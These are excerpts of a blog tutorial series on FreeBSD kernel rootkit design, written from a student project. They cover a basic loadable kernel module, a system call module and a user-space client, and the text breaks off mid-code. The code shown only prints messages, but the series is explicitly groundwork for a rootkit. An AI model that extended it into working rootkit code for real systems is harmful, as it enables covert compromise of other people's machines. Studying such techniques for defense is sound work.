        "excerpt":"As the title suggests, this is a howto tutorial on FreeBSD kernel rootkit design. It was prepared as notes as I worked on my college final year project while reading Designing BSD Rootkits: An Introduction to Kernel Hacking, where I got most of the information I needed. I then posted these notes on my blog hoping it could serve as a quick introduction to general kernel hacking. Those notes were filled with unorganized brainstorming and unnecessary technical details that even I myself couldn’t bear reading a page without drinking way too much coffee. It clearly failed it’s purpose.   It took me a year to realize that it’s a shame to give up all that hard work. I rewrote the whole thing to make them more like tutorials other than academic class notes.   I actually wanted to write this howto together with my college final year project synchronously, but sadly things didn’t work out the way I expected. It took me almost a year to reach this point of rewriting most of them to make them more like tutorials other than academic class notes.   Anyway, here I am, writing this intro again, hoping that I can finally finish it this time.   FreeBSD Kernel Rootkit Design and Defense Techniques is the title of my college final year project, I chose this topic because my lecturer who I consulted with thinks this one can help me at applying master degree in malicious software analysis.   I myself have no interest in pursuing master degree in malicious software analysis, but it sure sounds cool to me to create my very own rootkit, especially on my favorite platform, FreeBSD.   I still remember the lecturer asked me why I wanna make it on FreeBSD instead of Linux, well, there are two reasons.      I’m more familiar with FreeBSD than Linux   I don’t see any recent and public accessible rootkit for FreeBSD   Furthermore, there is another secret weapon to make my life even easier, Designing BSD Rootkits: An Introduction to Kernel Hacking by Joseph Kong. I highly recommend you guys to grab a copy of this book. It’s good, and it’s the only book on FreeBSD kernel rootkit design as far as I know, so you kinda have no choice here.   There’s another nice book to start with, The Design and Implementation of the FreeBSD Operating System By Marshall Kirk McKusick and George V. Neville-Neil. As the book name suggests, it can give you a detailed understanding of FreeBSD kernel. Get a copy of this book, read the first few chapters to get a rough understanding and use it as a reference book later on when you work on specific modules of the kernel.   What to Expect   Designing BSD Rootkits: An Introduction to Kernel Hacking by Joseph Kong is somehow sufficient for lots of people to kickstart their own rootkit, but you have to be familiar with modern system kernels and have some experiences in working in C.   However, I find this book a little bit rushy, what the author did was to drag you through lots of kernel terminologies and then give you lots of code snippets that, I myself at least, couldn’t understand until I read them for multiple times.   The Design and Implementation of the FreeBSD Operating System By Marshall Kirk McKusick and George V. Neville-Neil on the other hand, discusses overall FreeBSD kernel implementation and as well as each major kernel modules in detail, but the only drawback is that it doesn’t talk much about rootkit techniques, it only concentrates on normal kernel development.   So that’s why I wrote this series on FreeBSD Kernel Rootkit Design, it combines what I have learned, and what I think is useful from all those books and online resources. I also improved some of the examples from Joseph Kong’s book, filled in all related information which were omitted by the author.   Consider this as a tutorial series. If you are looking for a quick and comprehensive from novice to advanced novice guide on writing FreeBSD Kernel Rookits, then congratulations, this is just right for you.  ","categories": [],

        "title": "FreeBSD Rootkit Design Howtos - 1 - KLD First Kernel Loadable Module",
        "excerpt":"Needless to say that the first thing you need to start FreeBSD kernel rootkit development is a FreeBSD box. There are plenty of installation guides on the Internet about FreeBSD installation, so that I’ll just skip this part for the sake of simplicity.   And FYI, basically you are free to choose any hardware to run FreeBSD as long as it’s supported. You can even install your FreeBSD as a virtual machine. 5GB hard drive, at least 256MB memory with any modern CPU will do.   The Environment   The version of FreeBSD I’m going to use throughout this howtos is FreeBSD 9 Stable, it is recommended that you install at least FreeBSD 9 Release although I believe code examples in this howtos are able to run on most of versions after FreeBSD 6.2   myBSD# uname -a FreeBSD myBSD 9.0-STABLE FreeBSD 9.0-STABLE #0: Thu Mar  8 14:16:25 CST 2012 bestwc@myBSD:/usr/obj/usr/src/sys/GENERIC  amd64   Package Installation   You’ll need the FreeBSD source tree to compile your kernel rootkit, be sure to install it because it is not included in minimal installation. You can do this by two ways, the first is to enable src distribution option during installation, and the recommended way is to perform the following command after the installation.   myBSD# cp /usr/share/examples/cvsup/stable-supfile /root &amp;&amp; cd /root myBSD# ee stable-supfile ================================= *default host=CHANGE_THIS.FreeBSD.org ###Change this line *default host=cvsup.FreeBSD.org ###To this ================================= myBSD# csup -g -L2 stable-supfile   This will sync the source tree on your local file system to the latest one from remote repository, and this will simply download the latest for you if you don’t already have the source tree. It is recommended to run the cusp command shown above to frequently update your source tree, for this will make sure your are developing rootkit with the newest kernel source code, and potentially make it more compatible with new FreeBSD releases.   To examine if you have the src tree on your local box, type the following command:   myBSD# ls /usr/src COPYRIGHT       ObsoleteFiles.inc       crypto          lib         share LOCKS           README      etc         libexec         sys MAINTAINERS     UPDATING    games       release         tools Makefile        bin         gnu         rescue          usr.bin Makefile.inc1   cddl        include     sbin            usr.sbin Makefile.mips   contrib     kerberos5   secure   The Dynamic Kernel Linker (KLD)   The Dynamic Kernel Linker (KLD) is a facility in FreeBSD that allows users to interact with the system kernel by dynamically loading or unloading kernel modules. It may sounds strange to you, but believe it or not that you have utilized KLD multiple times during daily operations on your FreeBSD box. The KLD gets called every time you plug in or plug out a device, or by manually typing kldload or kldunload commands. It is especially useful to device driver developers as they can dynamically load their drivers as kernel module and test the functionalities on the fly without rebooting the system. For more information on the KLD, please refer to the FreeBSD Handbook.   The KLD provides a high way for us to put our code into the running kernel space without recompiling as long as we have the required privilege. So that, if we have our kernel rootkit compiled as loadable kernel module, then we’ll theoretically be able to load that module in any FreeBSD machines on the fly.   Although the KLD interface is not the only way for people to interact with kernel, but is undoubtedly the easiest and probably the fastest way to do that. The only question is, will there be any compatibility issues if we stick to KLD interface?      In FreeBSD 3.0, substantial changes were made to the kernel module subsystem, and the LKM Facility was renamed the Dynamic Kernel Linker (KLD) Facility. Subsequently, the term KLD is commonly used to describe LKMs under FreeBSD.    According to the quote above from Designing BSD Rootkits: An Introduction to Kernel Hacking by Joseph Kong, the KLD interface hasn’t been changed since FreeBSD 3.0, which means our yet-to-be-done rootkit should be able to run on any (not always true) modern FreeBSD systems without any (not always true as well) modification.   Just in case that you haven’t realized, we are going to use KLD interfaces a lot in this tutorial. Now let’s get to know the KLD interface more.   The Module Event Handler   When you load or unload any kernel modules to or from the current running kernel, the KLD interface will perform some pre-defined routines to prepare the system. This is called the Module Event Handler, it should be present in every(!) kernel module to handle the initialization and shutdown processes. This handler gets called every time when the code enters or exits kernel space.   (!) Just keep in mind that this isn’t always true, as what the quote says below from Designing BSD Rootkits: An Introduction to Kernel Hacking      Actually, this isn’t entirely true. You can have a KLD that just includes a sysctl. You can also dispense with module handlers if you wish and just use SYSINIT and SYSUNINIT directly to register functions to be invoked on load and unload, respectively. You can’t, however, indicate failure in those.    The prototype of the module event handler is defined in sys/module.h and it is called modeventhand_t   FILE:/usr/src/sys/sys/module.h  myBSD# cat /usr/src/sys/sys/module.h | grep modeventhand_t typedef int (*modeventhand_t)(module_t, int /* modeventtype_t */, void *);   And module_t is a pointer to the module’s struct as defined in the same file.   FILE:/usr/src/sys/sys/module.h  typedef struct module *module_t;   The modeventtype_t on the other hand is an enumerated type of event types defined in the same file as well.   FILE:/usr/src/sys/sys/module.h  typedef enum modeventtype {         MOD_LOAD,    /* Set when module is loaded. */         MOD_UNLOAD,    /* Set when module is unloaded. */         MOD_SHUTDOWN,    /* Set on shutdown. */         MOD_QUIESCE    /* Set on quiesce. */ } modeventtype_t;   With all these information, we can now try to define a simple module event handler. Here is a simple event handler function called load, which displays Hello, world! when it’s loaded, and print Good-bye, cruel world! when it’s unloaded.   static int load(struct module *module, int cmd, void *arg) {     int error = 0;      switch (cmd) {     case MOD_LOAD:         uprintf(\"Hello, world!\\n\");         break;      case MOD_UNLOAD:         uprintf(\"Good-bye, cruel world!\\n\");         break;      default:         error = EOPNOTSUPP; //EOPNOTSUPP stands for Error: Operation not supported.         break;     }      return(error); }   It’s perfectly safe if this code doesn’t make much sense to you, as we will get back later. However, what you do need to understand is the prototype of defining a module event handler.   This code snippet should present in your first loadable kernel module, and perform pre-defined routines according to the cmd sent by the kernel accordingly.   Consider this to be a protocol between your module and the kernel, which basically says “Oh the user asked you to unload me? Hold on and let me check my event handler, alright, I’ll print Good-bye, cruel world! and then go away.”   The DECLARE_MODULE Macro   It’s time to get back to our module declaration.   We now know module_t is a pointer to the module structure, but what on earth is a module and how do we define it? The thing is, we must let KLD know the basic information about our module, and it should register itself with kernel when it loads. This process can be awfully long and complicated, lucky that we have a pre-defined macro in sys/module.h that just does this to help us.   FILE:/usr/src/sys/sys/module.h #define DECLARE_MODULE_WITH_MAXVER(name, data, sub, order, maxver) #define DECLARE_MODULE(name, data, sub, order)  * The module declared with DECLARE_MODULE_TIED can only be loaded #define DECLARE_MODULE_TIED(name, data, sub, order)   As shown above, there are actually tree macros for us to declare a module, DECLARE_MODULE, DECLARE_MODULE_TIED, and DECLARE_MODULE_WITH_MAXVER.      DECLARE_MODULE            The simplest one that requires only four parameters to be passed, for normal purposes           DECLARE_MODULE_TIED            Use this macro when your kernel module can only be loaded into the kernel with exactly the same FreeBSD_version           DECLARE_MODULE_WITH_MAXVER            To declare kernel modules that can only run on machines with FreeBSD version maxver or lower           We’ll stick with the general DECLARE_MODULE macro, and now let’s discuss it’s four parameters: name, data, sub, and order.   name      This specifies the generic module name, which is passed as a character string.    data      This parameter specifies the official module name and event handler function, which is passed as a moduledata structure.    The moduledata structure is defined in sys/module.h   FILE:/usr/src/sys/sys/module.h typedef struct moduledata {         const char      *name;          /* module name */         modeventhand_t  evhand;         /* event handler */         void            *priv;          /* extra data */ } moduledata_t;   sub      This specifies the system startup interface namely sysinit_sui_id, which identifies the module type.    We can find a complete list of sysinit_sub_id from sys/kernel.h   FILE:/usr/src/sys/sys/kernel.h enum sysinit_sub_id {         SI_SUB_DUMMY            = 0x0000000,    /* not executed; for linker*/

0xfffffff     /* scheduler*/ };   sysinit_sub_id is a list of pre-defined enumerated constant data to declare kernel modules for different purposes. We’ll use SI_SUB_DRIVERS in our first few examples, and some other useful subs are to be introduced in later chapters.   order      This specifies the KLD’s order of initialization within the subsystem, namely the sysinit_elem_order.    A complete list of sysinit_elem_order can be found in sys/kernel.h   FILE:/usr/src/sys/sys/kernel.h enum sysinit_elem_order {         SI_ORDER_FIRST          = 0x0000000,    /* first*/         SI_ORDER_SECOND         = 0x0000001,    /* second*/         SI_ORDER_THIRD          = 0x0000002,    /* third*/         SI_ORDER_FOURTH         = 0x0000003,    /* fourth*/         SI_ORDER_MIDDLE         = 0x1000000,    /* somewhere in the middle */         SI_ORDER_ANY            = 0xfffffff     /* last*/ };   For the sake of simplicity and to concentrate on our purpose, we’ll stick to SI_ORDER_MIDDLE which declares our kernel module somewhere in the middle of the KLD subsystem. We will discuss the others if we need to.   Summary   We’ve talked lots of concepts and kernel terminology, probably too much for a beginner. So just before we go for example code, let’s try to quickly review what we have discussed first.           KLD is the way how we interact our code with FreeBSD kernel            Every KLD module (At least in our case) needs a module event handler called modeventhand_t and it is defined in sys/module.h                       The prototype of modeventhand_t requires module_t and modeventtype_t                        module_t is a pointer to our yet-to-be-declared module. We use DECLARE_MODULE to declare general kernel modules                        The DECLARE_MODULE is defined in sys/module.h and it requires four parameters: name, data, sub, and order                                   name is the general name for the module                                    data is passed as moduledata consists of the official name of the module and the event handler of the module. It is defined in sys/module.h                                    sub is the identifier of the type of the module. It is listed in sysinit_sub_id enum defined in sys/kernel.h                                    order is the initialization position of the module. It is listed in sysinitelemorder enum defined in sys/kernel.h                                            Finally we need modeventtype_t to complete modeventhand_t prototype                        modeventtype_t is an enum types of events defined in sys/module.h to let the kernel module perform corresponding actions when certain event happens                   Here are two figures for you to get an overall understanding of how this works.         Example Code   So, after all these pains and hair-pulling, we are finally gonna have our first kernel loadable module compiled.   /*  * FILE: /root/rootkit/1.1/first_module.c  * Example 1.1  * The First Kernel Loadable Module  * FreeBSD Rootkit Design Howtos @ hailang.im */ #include &lt;sys/param.h&gt; #include &lt;sys/module.h&gt; #include &lt;sys/kernel.h&gt; #include &lt;sys/systm.h&gt;  /* Define a loader function */ static int module_loader(struct module *module, int cmd, void *arg) {     int error=0;      switch(cmd)     {         case MOD_LOAD:             uprintf(\"Lets Rock the Kernel!\\n\");             break;          case MOD_UNLOAD:             uprintf(\"Time to Leave the Party!\\n\");             break;          default:             error=EOPNOTSUPP; //Operation not supported             break;     }     return (error); }  /* Define a module data structure */ static moduledata_t module_data = {     \"first_mlodule\",    // Module name     module_loader,      // Event Handler     NULL                // Extra Data };  /* Declare the module */ DECLARE_MODULE(first_mlodule, module_data, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);   Now there’s just one more thing left before we can compile the code, the makefile. If you are not familiar with the concept of makeifle, please google it and get yourself familiar with its basic syntax, just a little bit by now.   Here’s the content of makefile   KMOD=   first_module SRCS=   first_module.c  .include &lt;bsd.kmod.mk&gt;   Save it as makefile in the same folder with first_module.c   As you can see, we use bsd.kmod.mk macro here to make our life easier, because otherwise we’ll have to link all kernel source files manually.   All we have to do here is to fill in the module name and source file name. With the makefile and the source file with us, we can now go ahead and compile our first kernel module by entering make in the same folder.   myBSD# make Warning: Object directory not changed from original /root/rootkit/1.1 cc -O2 -pipe -fno-strict-aliasing -Werror -D_KERNEL -DKLD_MODULE -nostdinc   -I. -I@ -I@/contrib/altq -finline-limit=8000 --param inline-unit-growth=100 --param large-function-growth=1000 -fno-common  -fno-omit-frame-pointer  -mno-sse -mcmodel=kernel -mno-red-zone -mno-mmx -msoft-float  -fno-asynchronous-unwind-tables -ffreestanding -fstack-protector -std=iso9899:1999 -fstack-protector -Wall -Wredundant-decls -Wnested-externs -Wstrict-prototypes  -Wmissing-prototypes -Wpointer-arith -Winline -Wcast-qual  -Wundef -Wno-pointer-sign -fformat-extensions  -Wmissing-include-dirs -fdiagnostics-show-option   -c first_module.c ld  -d -warn-common -r -d -o first_module.ko first_module.o :&gt; export_syms awk -f /sys/conf/kmod_syms.awk first_module.ko  export_syms | xargs -J% objcopy % first_module.ko objcopy --strip-debug first_module.ko   Looks everything is nice and clean, we now have our first module successfully compiled. Now go ahead and treat yourself a muffin.   Let’s take a look at what we have now.   myBSD# ls @       export_syms first_module.c  first_module.ko first_module.o  machine     makefile    x86   We have several files and linkers added here, but hello.ko is what we really care about. That is the result of all our hard work — the loadable module.   It’s like an executable file, same as the file you get in regular application programing, and yes, it is distributable.   Just before you bite that muffin, let’s have our fun first by loading and unloading it.   myBSD# kldload ./first_module.ko Lets Rock the Kernel! myBSD# kldunload first_module.ko Time to Leave the Party! myBSD#   Sweet huh?

        "excerpt":"So, this is the second tutorial on FreeBSD Kernel Rootkit Design. I hope you have worked through the previous one before you continue, which is obviously a prerequisite.   What we’ve discussed are that KLD is the way we interact with kernel, and how to declare a module by having module name, module data (consists of official name and event handler function), sub, and order. And we agree on the not-completely-true assumption that every kernel module should have an event handler function which deals with event type such as MOD_LOAD, MOD_UNLOAD, and so on. If any of these terms sounds strange to you, I encourage you to go back and review FreeBSD Kernel Rootkit Design Howtos - 1 - KLD First Kernel Loadable Module   The System Call Module   Today we’re gonna talk about the system call module, which is a little bit different compared to the general module we’ve discussed previously.   A general module which we’ve talked about in the last session performs programmed actions only when certain actions take place, such as when it loads, unloads, shutdown, and etc.   A system call module on the other hand, is basically as same as the general KLD module, except that it installs itself as a kernel service request, and then listen to certain signals to perform programmed actions accordingly.   Such functions can be considered as kinda of a bridge between the kernel space and the user space, which enables the ability for its users to send signals to the kernel and make it react accordingly.   What makes this system call module different is that, instead of printing messages every time we load or unload the module, we’re gonna make it print messages every time we send command to it.   Here in this session, we’re gonna talk about the system call module, its structure, its declaration routine, and finally write our first system call module along with a tiny client application to send command to it.   The System Call Function   A system call function is a function defined in the system call module, which contains a list of actions to be taken every time it receives a system call.   It’s similar to the module event handler except that we have control over what command to receive and what actions to perform.   The prototype of system call function is defined in sys/sysent.h and is shown below.   FILE:/usr/src/sys/sys/sysent.h  typedef int     sy_call_t(struct thread *, void *);   The struct struct thread * points to the current running thread, which you don’t have to care about it at this stage. The void * points to the structure of system call’s arguments.   Compare to the general KLD module, the system call module can receive multiple arguments instead of limited and pre-defined ones. So it is your responsibility to define the arguments that the system call module needs to deal with.   Since the system call’s arguments are wrapped in a struct, so we can define it like this:   struct sc_example_args {     char *str; };   Having the system call’s arguments struct successfully defined, we can now declare our system call function like this:   static int sc_example(struct thread *td, void *syscall_args) {     struct sc_example_args *uap;     uap = (struct sc_example_args *)syscall_args;     printf(\"%s\\n\", uap-&gt;str);     return(0); }   The first line is obvious the declaration of the system call function, note that we can receive all arguments via void *syscall_args inside the function.   Let’s now take a look at what happens inside the function, we firstly initialized (It’s not the precise term, but it helps) a local variable *uap using our defined sc_example_args structure.   And then convert the incoming arguments from *syscall_args to match our standard, the sc_examples_args structure, and let the *uap pointer points to it. The simple version of this, is we receive arguments from *syscall_args and save it in *uap with the sc_example_args format.   Now we can do whatever we want with the arguments received, such as print out the string like this:  printf(\"%s\\n\", uap-&gt;str);   Looks we have successfully declared a system call function, but we actually just made a huge mistake.   What I mean by mistake is that the code can still be compiled and executed, but we did it in a very bad manner. You see that modern operating systems segregate it’s memory areas into user space and kernel space, code running in each section don’t directly access each other’s resources. The way we assign a user space structure pointer to a kernel space local variable (uap = (struct sc_example_args *)syscall_args;) is unsafe and not recommended.   Here’s a quote from Designing BSD Rootkits: An Introduction to Kernel Hacking that explains a little bit about kernel space and user space.      FreeBSD segregates its virtual memory into two parts: user space and kernel space. User space is where all user-mode applications run, while kernel space is where the kernel and kernel extensions (i.e., LKMs) run. Code running in user space cannot access kernel space directly (but code running in kernel space can access user space). To access kernel space from user space, an application issues a system call.    Let’s move on for now and get back to kernel/user space transition in details later.   The sysent Structure   Still remember the general module declaration macro in the previous session? Well the system call modules need to register themselves by calling a macro as well, but we have to define a sysent structure first and then pass it to the declaration macro.   The sysent structure is similar to the moduledata that we’ve discussed in the last session, it contains the basic information about the system call. So that once we register a system call module with sysent structure, the operating system will know where and how to quickly fire it.   The FreeBSD system actually maintains a table of sysent structures of all system call modules that are currently loaded in the running kernel, thus every system call module has to provide its sysent structure during initialization to register itself with the sysent table.   So be sure that you understand how sysent structure differs from sysent table before we take a look at its definition in sys/sysent.h   FILE:/usr/src/sys/sys/sysent.h  struct sysent {                 /* system call table */         int     sy_narg;        /* number of arguments */         sy_call_t *sy_call;     /* implementing function */         au_event_t sy_auevent;  /* audit event associated with syscall */         systrace_args_func_t sy_systrace_args_func;                                 /* optional argument conversion function. */         u_int32_t sy_entry;     /* DTrace entry ID for systrace. */         u_int32_t sy_return;    /* DTrace return ID for systrace. */         u_int32_t sy_flags;     /* General flags for system calls. */         u_int32_t sy_thrcnt; }; … extern struct sysent sysent[];   I guess the comments in above code explain exactly what you need to know. Note that normally we just need to specify sy_narg and *sy_call for this to work.   Now we can extend our previous example code as following:   struct sc_example_args {     char *str; };  static int sc_example(struct thread *td, void *syscall_args) {     struct sc_example_args *uap;     uap = (struct sc_example_args *)syscall_args;     printf(\"%s\\n\", uap-&gt;str);     return(0); }  static struct sysent sc_example_sysent = {     1,              /* number of arguments */     sc_example      /* implementing function */ };   The Offset Value   Same as the system call function and the sysent structure, the offset value is another parameter you need to set and pass to the system call module declaration macro. Basically, the offset value is the system call module’s number, which will be used by the system to refer to its sysent structure in the sysent table.   It should be an unique integer, and should be explicitly declared in a system call’s declaration macro. It is considered as a good practice to not to assign fixed numbers to dynamic system call modules. Instead, we can ask the system to dynamically assign an unused offset number for our system call module by doing this:   static int offset = NO_SYSCALL;   NO_SYSCALL is a constant, meaning the next available slots offset in sysent table.   Just in case if you are interested, the value for NO_SYSCALL is -1 as shown below:   FILE:/usr/src/sys/sys/sysent.h  #define NO_SYSCALL (-1)   Some of the pre-defined system call offsets are listed in the /sys/kern/syscalls.master file, here’s some allocations:                  Offset Range       Comment                       0-150       Reserved/unimplemented system calls. For use in future Berkeley releases.                 151-180       Reserved for vendor-specific system calls                 181-199       Used by/reserved for BSD                 210-219       Reserved for loadable syscalls                 220-249       Were introduced with NetBSD/4.4Lite-2                 250-299       Initially used in OpenBSD                 300-531       Syscall numbers for FreeBSD           The SYSCALL_MODULE Macro   I said at the beginning of this tutorial that we are gonna need to call a macro to declare a system call module, but we needed to know few other things first. We talked about system call function, we talked about sysent structure and we talked about the offset value.   We need these declared first and only then we can call the SYSCALL_MODULE macro. It is defined in sys/sysent.h as following   FILE:/usr/src/sys/sys/sysent.h  #define SYSCALL_MODULE(name, offset, new_sysent, evh, arg)   Different from the DECLARE_MODULE macro which requires four parameters: name, data, sub, and order, the SYSCALL_MODULE requires five parameter to be passed, which are:   name      This specifies the generic module name, which is passed as a character string.    offset      This specifies the system call’s offset value, which is passed as an integer pointer.    new_sysent      This specifies the completed sysent structure, which is passed as a struct sysent pointer.    evh      This specifies the event handler function.    arg      This specifies the arguments to be passed to the event handler function. For our purposes, we’ll always set this parameter to NULL.    Great, we can now further extend our previous example code as following   struct sc_example_args {     char *str; };  static int sc_example(struct thread *td, void *syscall_args) {     struct sc_example_args *uap;     uap = (struct sc_example_args *)syscall_args;     printf(\"%s\\n\", uap-&gt;str);     return(0); }  static struct sysent sc_example_sysent = {     1,              /* number of arguments */     sc_example      /* implementing function */ };  static int offset = NO_SYSCALL;  SYSCALL_MODULE(sc_example, &amp;offset, &amp;sc_example_sysent, evh, NULL);   Don’t worry about the event handler function evh, it will be exactly same as general module’s event handler function. You’ll see that in the complete example soon, for now let’s sum things up first.   Summary           System Call Module is another type of kernel loadable module            It installs itself in the kernel space and perform programmed activities according to signals received from user space            In order to declare a system call module, five parameters are required, name, offset, new_sysent, evh, and arg                       name is the general module name                        offset is the system call module’s offset number                      It determines where to store the system call module’s sysent structure in sysent[] table                                new_sysent is a pointer to the system call module’s sysent structure                                   sysent structure is similar to moduledata                                    It contains basic information about the system call module including                                               Number of arguments it expects                                                And implementing function                                                                The implementation function, also known as the system call function                                    It contains a list of actions to be taken every time it receives a particular signal                                       Example Code   We can now write the our first system call module, take a look at the following code, there are some comments there to help you understand. There is absolutely nothing new except the event handler function, which in fact, isn’t new to us as well.   /*  * FILE: /root/rootkit/2.1/sc_example.c  * Example 2.1  * The First System Call Module  * FreeBSD Rootkit Design Howtos @ hailang.im */ #include &lt;sys/types.h&gt; #include &lt;sys/param.h&gt; #include &lt;sys/proc.h&gt; #include &lt;sys/module.h&gt; #include &lt;sys/sysent.h&gt; #include &lt;sys/kernel.h&gt; #include &lt;sys/systm.h&gt; #include &lt;sys/sysproto.h&gt;  /* The system call's arguments. */ struct sc_example_args {     char *str; };  /* The system call function. */ static int sc_example(struct thread *td, void *syscall_args) {     struct sc_example_args *uap;     uap = (struct sc_example_args *)syscall_args;      printf(\"%s\\n\",uap-&gt;str);      return (0); }  /* The sysent for the new system call */ static struct sysent sc_example_sysent = {     1,          /* number of arguments */     sc_example  /* implementing function */ };  /* The offset in sysent[] where the system call is to be allocated. */ static int offset = NO_SYSCALL;  /* The function called at load/unload. */ static int load(struct module *module, int cmd, void *arg) {     int error = 0;      switch(cmd) {     case MOD_LOAD:         uprintf(\"System call loaded at offset %d.\\n\", offset);         break;     case MOD_UNLOAD:         uprintf(\"System call unloaded from offset %d.\\n\", offset);         break;     default:         error = EOPNOTSUPP;         break;     }      return(error); }  /* Declare the System Call Module */ SYSCALL_MODULE(sc_example, &amp;offset, &amp;sc_example_sysent, load, NULL);   As usual, we need to have a makefile in the same directory as the source code file.

Loading and Calling   Here’s the final step we need to take to make use of our first system call module, the loading, and the calling. Let’s firstly try to load the module into the running kernel, and then figure out how to issue the system call.   myBSD# kldload ./sc_example.ko System call loaded at offset 210.   Thanks to our event handler, it prints out the system call number which is the offset value of the system call module’s sysent structure in sysent[] table. You’ll soon realize how important it is for us to issue a system call.   Now we have two ways to send command to our system call module, we can either write a user space application, or type a simple command. I will talk about the command first since the user space application will be covered in next session.   myBSD# kldload ./sc_example.ko System call loaded at offset 210. myBSD# perl -e '$str = \"Hello kernel!\\n I am here to dance with you!\";' -e 'syscall(210, $str);' myBSD# dmesg | tail -n 2 Hello kernel!  I am here to dance with you!   Note that we explicitly specified the system call number in that perl command to send our command to our system call module.   That’s all for today, we made an upgraded version of fun kernel printing tookit which can print whatever string you want it to. We’ll talk about how to call a system call module without knowing it’s offset value in the next tutorial. See you there.  ","categories": [],

        "excerpt":"Welcome back to FreeBSD Kernel Rootkit Design Howtos, we’ll walk through all necessary techniques you need to program your own BSD kernel rookit. Please be sure you’ve read the previous guides before you proceed with this one.   Review   Same as usual, let’s review what we’ve discussed in the last session. Basically a new kind of kernel module was introduced — The system call module, it registers itself as a kernel service and wait for user to call it via system calls.   SYSCALL_MODULE is the registration macro for system call modules to install themselves into the running kernel, and it requires five parameters:           name as a generic name for the system call module            offset value which determines in which location in the sysent[] table to save our system call module’s sysent structure            new_sysent pointer to a sysent_t structure that contains basic info about the system call module such as number of arguments and pointer to it’s implementation function            implementation function defines activities you want your system call module to perform every time when it receives system call       In this session, we’ll make a custom client application that calls our kernel service module directly without knowing the module’s offset value.   The modfind Function   The modfind function is our key to solve the inflexibility issue, it is very useful but a little bit confusing.   As the name implies, the modfind function helps us to find a specific module in a running kernel by giving it the module name. It is sweet ’cause keeping track of module names is much easier than a bunch of module offset values.   Now the confusing part is, opposite to what you may have guessed, the return value of this function is NOT the system call module’s offset value, but it’s id.   Let’s take a look at a sample piece of modfind function code.   #include &lt;sys/param.h&gt; #include &lt;sys/module.h&gt;  int modfind(const char *modname);   The modstat Function   As we can only obtain the id of the system call module by calling modfind function, so here’s what really give us answers - the modstat function.   #include &lt;sys/param.h&gt; #include &lt;sys/module.h&gt;  int modstat(int modid, struct module_stat *stat);   The int modid is where we should pass the result of modfind function, but we won’t get the offset value from the function’s return value.   Instead, we have to construct a module_stat structure, and the modstat function will save results to it. That is why we are passing a pointer to a module_stat structure as the second parameter.   The module_stat structure is defined in sys/module.h as shown below   FILE: /usr/src/sys/sys/module.h  struct module_stat {         int             version;        /* set to sizeof(struct module_stat) */         char            name[MAXMODNAME];         int             refs;         int             id;         modspecific_t   data; };  typedef union modspecific {         int     intval;         u_int   uintval;         long    longval;         u_long  ulongval; } modspecific_t;   I know this looks messy, but luckily we don’t need to deal with all of them.   The first part of the code is the definition of module_stat structure, and it contains a modspecific_t union which is defined in the second part, our offset value is stored in this union as intval.   Confusing right, you don’t see any variable name here with offset value in it. The good news is, that’s all we have to learn today, we’ll get to the example code after the summary.   Summary   We now know that having a native client to call system call modules is much better than the perl command we used in last session. It is better because,           We don’t have to remember the offset value of the system call module to call it. This is especially useful when we have to maintain multiple system call modules            The offset value of system call module changes every time we reload it. We’ll still have our flexibility since we rely on module name which is not likely to be changed over time       The way how the client works is that we use modfind to find out the id of a given module name, but sadly it’s not the module’s offset value, which we can’t use to issue the system call.   So we have to utilize another function which is modstat that will give us back a modspecific union, in which we can get the real offset value we want from the intval integer.   Here’s a figure to make your life miserable, you can thank me later. : ] Oh god, why I’m so bad at drawing…      Example Code   Now it’s time for us to see some examples. Let’s firstly start with the example from Designing BSD Rootkits: An Introduction to Kernel Hacking with some additional comments to help you understand the code.   #include &lt;stdio.h&gt; #include &lt;sys/syscall.h&gt; #include &lt;sys/types.h&gt; #include &lt;sys/module.h&gt;  int main(int argc, char *argv[]) //Main function of our client application {     if (argc != 2) { //Check the parameter passed to the application,                      //print out usage help information                      //if we got wrong number of parameters.         printf(\"Usage:\\n%s &lt;string&gt;\\n\", argv[0]);         exit(0);     }      struct module_stat stat; //This is the module_stat structure     int syscall_num; //We'll get the offset value and store it here.       /* Determine sc_example's offset value. */     stat.version = sizeof(stat); //set version to sizeof(struct module_stat)     modstat(modfind(\"sc_example\"), &amp;stat);     syscall_num = stat.data.intval;      /* Call sc_example. */     return(syscall(syscall_num, argv[1])); //Return the statues of the system call }   Unlike kernel modules which we need a makefile to automate some extreme nasty stuff, we don’t need one for this simple client side application. We can directly compile the code like this,   myBSD# gcc -o client client.c client.c: In function 'main': client.c:12: warning: incompatible implicit declaration of built-in function 'exit' myBSD# ls client      client.c   Looks good so far, we’ve got the client executable file. Let’s load the previous sc_example module and try to call it with our client application.   myBSD# kldload ./sc_example.ko System call loaded at offset 210. myBSD# ./client Usage: ./client &lt;string&gt; myBSD# ./client Hey\\ Kernel! Bad system call (core dumped)   We loaded the sc_example module at offset value of 210, we got a nice help message when wrong number of parameter is specified, which is nice, but we end up with a Bad system call error when we give it the right amount of parameters.   This is bad, because we’ve got nearly no clue of what had happened, and what caused it. But just before we panic, let’s calm down and think about this error message which is our only lead to the problem, which says Bad system call.   It is obvious that we were calling a bad kernel module, so bad that our little client crashed. If we called a bad kernel module in our syscall function, then that means the return value of modfind or modstat function is wrong, or maybe both of them are wrong, who knows.   So I did a little bit debugging, and I soon realized that the return value of modfind is -1, which is obviously bad.   #include &lt;stdio.h&gt; #include &lt;sys/syscall.h&gt; #include &lt;sys/types.h&gt; #include &lt;sys/module.h&gt;  int main(int argc, char *argv[]) //Main function of our client application { ...     printf(\"The return value of modfind is: %d\\n\", modfind(\"sc_example\")); ... }   The result says   myBSD# gcc -o client client.c myBSD# ./client The return value of modfind is: -1   Alright, -1, it probably means fail to find this module, or given module was not found. Given that the module name is the only parameter for the modfind function, it is obvious that the module name is wrong.   This is interesting, we all know that the module name is right, so there’s something wrong from the very beginning. The very source of a system call module is of course it’s declaration macro, so let’s look at there and see if we can get any luck.   FILE:/usr/src/sys/sys/sysent.h #define SYSCALL_MODULE(name, offset, new_sysent, evh, arg)      \\ static struct syscall_module_data name##_syscall_mod = {        \\         evh, arg, offset, new_sysent, { 0, NULL, AUE_NULL }     \\ };                                                              \\                                                                 \\ static moduledata_t name##_mod = {                              \\         \"sys/\" #name,                                           \\         syscall_module_handler,                                 \\         &amp;name##_syscall_mod                                     \\ };   Here we go, a module name prefix! That means every kernel module registered with SYSCALL_MODULE will be given a sys/ prefix in front of their names.   Now we know the root of the problem, let’s modify our code and try again.   #include &lt;stdio.h&gt; #include &lt;sys/syscall.h&gt; #include &lt;sys/types.h&gt; #include &lt;sys/module.h&gt;  int main(int argc, char *argv[]) //Main function of our client application {     if (argc != 2) { 